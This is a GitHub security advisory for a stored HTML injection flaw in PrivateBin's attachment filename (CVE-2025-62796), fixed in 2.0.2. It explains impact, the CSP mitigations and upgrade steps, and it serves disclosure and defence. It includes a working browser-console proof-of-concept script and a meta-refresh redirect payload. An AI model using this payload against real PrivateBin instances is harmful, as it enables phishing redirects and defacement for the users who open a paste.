{
  "Severity": "MODERATE",
  "UpdatedAt": "2025-10-28T20:14:09Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "privatebin/privatebin"
  },
  "Advisory": {
    "DatabaseId": 319257,
    "Id": "GSA_kwCzR0hTQS04NjdjLXA3ODQtNXE2Z84ABN8Z",
    "GhsaId": "GHSA-867c-p784-5q6g",
    "References": [
      {
        "Url": "https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-867c-p784-5q6g"
      },
      {
        "Url": "https://github.com/PrivateBin/PrivateBin/commit/c4f8482b3072be7ae012cace1b3f5658dcc3b42e"
      },
      {
        "Url": "https://github.com/advisories/GHSA-867c-p784-5q6g"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-867c-p784-5q6g"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-62796"
      }
    ],
    "Description": "We’ve identified an HTML injection/XSS vulnerability in PrivateBin service that allows the injection of arbitrary HTML markup via the attached filename. Below are the technical details, PoC, reproduction steps, impact, and mitigation recommendations.\n\n**Recommend action:** As the vulnerability has been fixed in the latest version, users are **strongly encouraged** to upgrade PrivateBin to the latest version _and_ [check](https://privatebin.info/directory/check) that a strong CSP header, just as the default suggested one, is delivered.\n\n**Summary of the vulnerability:** The `attachment_name` field containing the attached file name is included in the object that the client encrypts and is eventually rendered in the DOM without proper escaping.\n\n## Impact\nThe vulnerability allows attackers to inject arbitrary HTML into the filename displayed near the file size hint, when attachments are enabled. This is by definition [a XSS vulnerability (CWE-80)](https://cwe.mitre.org/data/definitions/80.html), in this case even a persistent XSS. As any HTML can be injected, basically, this can e.g. be used to inject [a script tag (as per CWE-79)](https://cwe.mitre.org/data/definitions/79.html).\n\nThat said, also due to [previous issues](#more-informaton), we have strong mitigations for this in place. The [content security policy (CSP)](https://content-security-policy.com/) does, if configured as recommend by the PrivateBin project, prevent any inline script execution, so the confidentiality of the paste is _not_ affected.\n\nHowever, as the reporter demonstrated, even when script execution is blocked, an HTML injection can still be used for attacks such as:\n* redirection using a meta redirect tag to redirect to a potentially malicious/attacker-controlled website\n* defacement of the website\n* phishing, in combination with the redirection to a clone of a PrivateBin phishing page or similar\n* potential attacks on other services hosted on the same domain\n\nThis list is by no means meant to be exhaustive, other attacks should be considered possible, that is why we treat this issue as a serious issue, even if the CSP is supposed to block the most attacks.\n\n\u003e [!IMPORTANT]  \n\u003e Depending on the deployment, if the server has a different than the recommend CSP configured or the client (browser) somehow lacks a protection, the vulnerability can have much more serious impacts and potentially also allow XSS, which could mean the confidentiality of the PrivateBin instance is affected. \n\n## Technical Description\n\nThe front-end uses PrivateBin (client-side encryption) to format and encrypt data before sending. During the paste creation process, the client assembles a `cipherMessage` object containing, among other fields:\n* `paste` -\u003e paste text\n* `attachment` -\u003e file content (data-URI)\n* `attachment_name` -\u003e array with file names\n\nBefore encryption, the `ServerInteraction.setCipherMessage(cipherMessage)` function is called. By intercepting/altering the `cipherMessage` on the client immediately before encryption, it is possible to replace `attachment_name` with an attacker-controlled string; this string becomes part of the encrypted content, and when the paste is opened, the local client decrypts and inserts the name into the DOM unescaped, allowing the interpretation of inserted HTML markup.\n\nNote that it was not necessary to reimplement encryption: the monkeypatch modifies the object before the client applies AES-GCM/PBKDF2/compression, thus avoiding ciphertext formatting issues.\n\n## Proof of concept\nPaste this into the console on the PrivateBin page before clicking Create.\n\n```js\n// Monkeypatch to modify attachment_name immediately before encryption\n(() =\u003e {\n  const desiredName = '\"\u003e\u003cmeta http-equiv=\"refresh\" content=\"0;url=https://example.com/\"\u003e.txt'; // \u003c- adjust here\n\n  // get the namespace used by PrivateBin\n  if (!window.$ || !$.PrivateBin || !$.PrivateBin.ServerInteraction) {\n    return console.error('PrivateBin namespace not found (make sure you are on the PrivateBin page).');\n  }\n\n  const SI = $.PrivateBin.ServerInteraction;\n  // save original function\n  const origSetCipherMessage = SI.setCipherMessage?.bind(SI);\n\n  if (typeof origSetCipherMessage !== 'function') {\n    return console.error('setCipherMessage not found or is not a function.');\n  }\n\n  SI.setCipherMessage = async function(cipherMessage) {\n    try {\n      // cipherMessage here is the plain object the client intends to encrypt\n      if (cipherMessage \u0026\u0026 Array.isArray(cipherMessage.attachment_name)) {\n        console.log('[patch] original attachment_name:', cipherMessage.attachment_name);\n        cipherMessage.attachment_name = cipherMessage.attachment_name.map(() =\u003e desiredName);\n        console.log('[patch] attachment_name overwritten to:', cipherMessage.attachment_name);\n      } else if (cipherMessage \u0026\u0026 cipherMessage.attachment \u0026\u0026 Array.isArray(cipherMessage.attachment)) {\n        // if there are attachments but no attachment_name (rare), add a coherent array\n        cipherMessage.attachment_name = cipherMessage.attachment.map(() =\u003e desiredName);\n        console.log('[patch] attachment_name added:', cipherMessage.attachment_name);\n      } else {\n        // nothing to change\n      }\n\n      // call the original implementation (which performs the encryption)\n      return await origSetCipherMessage(cipherMessage);\n    } catch (err) {\n      console.error('Error in setCipherMessage monkeypatch:', err);\n      // in case of error, attempt to call the original anyway\n      return await origSetCipherMessage(cipherMessage);\n    }\n  };\n\n  console.log('Monkeypatch applied to ServerInteraction.setCipherMessage() - ready to send. (Reload the page to undo).');\n})();\n```\n\n## Reproduction Steps\n\n1. Access PrivateBin (in the program scope). A requirement is that you have file upload enabled.\n2. Attach any file via the UI (file content irrelevant).\n3. Open the browser console (F12 → Console).\n4. Paste the snippet above and adjust `desiredName` to the desired HTML payload (e.g.,` \"\u003e\u003cmeta http-equiv=\"refresh\" content=\"0;url=https://example.com/\"\u003e.txt`).\n5. Click Create. The client will encrypt and send the paste normally.\n6. Intercept/inspect the POST request (optional).\n7. Open the generated link.\n\n**What happens:** When rendering the paste, the content of the injected attachment_name will be interpreted according to the context, demonstrating the impact.\n\n## Mitigation\n\nWe strongly recommend you to **upgrade to our latest release**. However, here are some workarounds that may help you to mitigate this vulnerability without upgrade:\n\n* Update the [CSP in your configuration file](https://github.com/PrivateBin/PrivateBin/wiki/Configuration#cspheader) to the latest recommended settings and check that it isn't getting reverted or overwritten by your web server, reverse proxy or CDN, i.e. using [our offered check service](https://privatebin.info/directory/check).\n   **Note:** You should check your CSP independently, even if you upgrade to a fixed version. See also the section [\"More information\"](#more-information) about how we recently enhanced the CSP protection. \n* Deploying PrivateBin on a separate domain may limit the scope of the vulnerability to PrivateBin itself and thus, as described in the “Impact” section, effectively prevent any damage by the vulnerability to other resources you are hosting.\n* As explained in the impact assessment, disabling attachments also prevents this issue.\n\n## Patches\n\nThe issue has been patched in version 2.0.2. The change that displayed the attachment name without sanitation was introduced in version 1.7.7. The code-changes in PrivateBin mitigating this issue can be found in commit c4f8482b3072be7ae012cace1b3f5658dcc3b42e.\n\n## References\nWe highly encourage server administrators and others involved with the PrivateBin project to read-up on how Content-Security-Policies work, especially should you consider to manually adjust it:\n* https://content-security-policy.com/\n* https://developer.mozilla.org/docs/Web/HTTP/CSP\n* https://developers.google.com/web/fundamentals/security/csp/\n\nAlso please note that if multiple headers are set (as e.g. done via our introduced meta tag) [browsers should apply the most restrictive set of the policies](https://stackoverflow.com/a/51153816/5008962), [as per the CSP specification](https://www.w3.org/TR/CSP2/#enforcing-multiple-policies).\n\n## More information\nThis issue is similar to https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-cqcc-mm6x-vmvw, but was, based on our analysis, apparently introduced in https://github.com/PrivateBin/PrivateBin/pull/1550.\n\nNote that we have, independently as of this issue and as per regular security maintenance, already applied many CSP improvements and strengthened this security mechanism of PrivateBin. This includes in detail:\n* As part of the [last XSS vulnerability](#more-information), we have now included the CSP in a meta HTML tag, too, so in case the headers are somehow mangled with by (reverse) proxies or similar, the PrivateBin instance should still be protected as long as this HTML meta tag is included in an unchanged way.\n* https://github.com/PrivateBin/PrivateBin/pull/1613 - We have removed a outdated configuration recommendation, as `default-src` does not need to allow `self` anymore, but it can keep the more strict `none` even when using the bootstrap SVG icons. ([previously a problem in Firefox prevented this](https://bugzilla.mozilla.org/show_bug.cgi?id=1773976))\n* https://github.com/PrivateBin/PrivateBin/pull/1464 - We could remove the previously used `unsafe-eval` that was a potentially risky CSP source being allowed for scripts, and replaced it with `wasm-unsafe-eval` for the streaming of a WebAssembly component used for optional compression. This can be disabled in the configuration and then `wasm-unsafe-eval` can also be removed.\n\nIn case you have not noticed this and did not upgrade your CSP header yet, **we strongly recommend to do it as soon as possible**!\n\n## Credits\n\nOn Thursday October 23rd, 2025 we received a report via email at security@privatebin.org. The reporter asked to stay anonymous. We thank them a lot for the detailed reporting of this vulnerability, including the description of the proof of concept listed above!\n\nIn general, we'd like to thank everyone reporting issues and potential vulnerabilities to us.\n\nIf you think you have found a vulnerability or potential security risk, [we'd kindly ask you to follow our security policy](https://github.com/PrivateBin/PrivateBin/blob/master/SECURITY.md) and report it to us. We then assess the report and will take the actions we deem necessary to address it.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-10-28T20:14:09Z",
    "Severity": "MODERATE",
    "Summary": "PrivateBin is missing HTML sanitization of attached filename in file size hint",
    "UpdatedAt": "2025-10-28T20:14:09Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 5.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "2.0.2"
      },
      "VulnerableVersionRange": "\u003e= 1.7.7, \u003c 2.0.2"
    }
  ]
}